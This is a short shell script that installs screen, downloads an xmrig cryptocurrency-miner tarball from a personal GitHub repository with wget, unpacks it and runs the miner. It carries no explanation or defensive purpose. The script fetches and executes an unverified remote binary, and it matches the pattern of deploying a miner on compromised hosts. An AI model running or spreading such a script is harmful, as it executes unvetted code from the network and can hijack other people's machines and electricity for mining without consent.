#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/tuslam24/RTM/raw/main/xmrig-6.18.0.tar
tar -xf xmrig-6.18.0.tar
cd xmrig-6.18.0
./xmrig
sleep 999
